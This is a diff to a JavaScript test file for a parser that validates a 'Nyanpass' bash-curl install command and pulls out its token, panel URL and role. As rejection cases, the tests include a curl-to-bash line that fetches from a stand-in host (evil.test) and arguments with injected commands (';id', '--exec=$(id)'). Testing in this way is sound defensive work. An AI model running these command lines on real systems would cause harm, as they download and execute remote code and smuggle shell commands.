@@ -25,10 +25,12 @@ function handler(source, method, nextMethod) {
 }
 
 test('official command parser exposes only the validated structured credential fields', () => {
-  const parsed = parseOfficialNyanpassCommand('bash <(curl -fLSs https://dl.nyafw.com/download/nyanpass-install.sh) rel_nodeclient "-o -t 123e4567-e89b-42d3-a456-426614174000 -u https://ny.example.test"');
-  assert.deepEqual(parsed, { ok: true, args: '-o -t 123e4567-e89b-42d3-a456-426614174000 -u https://ny.example.test', clientToken: '123e4567-e89b-42d3-a456-426614174000', panelUrl: 'https://ny.example.test', role: 'outbound' });
+  const parsed = parseOfficialNyanpassCommand('bash <(curl -fLSs https://dl.nyafw.com/download/nyanpass-install.sh) rel_nodeclient "-o -t 123e4567-e89b-42d3-a456-426614174000 -u https://ny.example.test --ws-port 1145"');
+  assert.deepEqual(parsed, { ok: true, args: '-o -t 123e4567-e89b-42d3-a456-426614174000 -u https://ny.example.test --ws-port 1145', clientToken: '123e4567-e89b-42d3-a456-426614174000', panelUrl: 'https://ny.example.test', role: 'outbound' });
+  assert.equal(parseOfficialNyanpassCommand('bash <(curl -fLSs https://dl.nyafw.com/download/nyanpass-install.sh) rel_nodeclient "-t abcdefgh -u https://ny.example.test --ws-port 1145"').role, 'inbound');
   assert.equal(parseOfficialNyanpassCommand('bash <(curl -fLSs https://evil.test/x) rel_nodeclient "-t abcdefgh -u https://ny.example.test"').ok, false);
   assert.equal(parseOfficialNyanpassCommand('bash <(curl -fLSs https://dl.nyafw.com/download/nyanpass-install.sh) rel_nodeclient "-t abcdefgh -u https://ny.example.test;id"').ok, false);
+  assert.equal(parseOfficialNyanpassCommand('bash <(curl -fLSs https://dl.nyafw.com/download/nyanpass-install.sh) rel_nodeclient "-t abcdefgh -u https://ny.example.test --exec=$(id)"').ok, false);
 });
 
 test('credentials are AES-GCM encrypted with task-bound AAD and fail closed without a key', () => {
